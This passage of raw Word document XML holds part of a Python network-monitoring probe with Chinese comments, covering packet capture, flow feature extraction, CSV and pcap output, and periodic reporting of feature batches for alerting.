        <w:t xml:space="preserve">        if args.csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C32B179">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            import csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204E3B32">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34D1A011">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            Path(args.csv).parent.mkdir(parents=True, exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5965F199">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self._csv = open(args.csv, "a", newline="", encoding="utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6267D66B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self._csv_writer = csv.writer(self._csv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A8E0D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self._csv.tell() == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CF01EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self._csv_writer.writerow(["first_seen", "last_seen", "flow_key"] + feature_names)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0631504D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79A20E62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 抓包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143F3EEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A0AEAC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def handle(self, pkt):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2B2BBA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rec = to_record(pkt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51327770">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if rec is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AC9FB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47736468">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.table.add(rec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D1BE8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.packets += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6469C053">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if self._pcap_writer is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792BC7A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self._pcap_writer.write(pkt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F6E356">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if self.args.count and self.packets &gt;= self.args.count:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0193D58E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.running.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE91917">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01CF1E9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 上报</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AD9761">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="316456DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def flush(self, now: float) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3FFDE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flows = self.table.expire(now, max_age=self.args.max_age)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544ECCF3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not flows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DA3336">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0CA791">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        batch = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2074C823">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for flow in flows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB6D70F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            feats = flow_features(flow)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640A78C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            batch.append((flow.key, flow.start, flow.last, to_vector(feats, self.feature_names)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63059191">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self._csv_writer:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A03F93A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self._csv_writer.writerow(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DBFAA8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    [flow.start, flow.last, "|".join(str(p) for p in flow.key)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60AACDBE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    + [feats[n] for n in self.feature_names]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9B1687">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A97FC91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if self._csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4806706A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self._csv.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CBB5700">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not batch:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70CE14F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7029B65B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if self.reporter is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A94FB5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.flows_sent += len(batch)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E35D2A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347683C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        receipt = self.reporter.send(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347B40DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.feature_names,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B89791">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            batch,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E79FC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            {"start": now - self.args.window, "end": now},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2891E366">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F135A25">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.flows_sent += len(batch)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F01D4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if receipt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A29F96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.alerts += int(receipt.get("alerts", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1150D8C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BF587D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _flush_loop(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66CA5AB1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        while self.running.is_set():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B46763A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            time.sleep(self.args.window)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B91182">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5724911A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.flush(time.time())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A222588">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            except Exception as exc:  # 单次上报失败不能把探针打死</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25617261">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
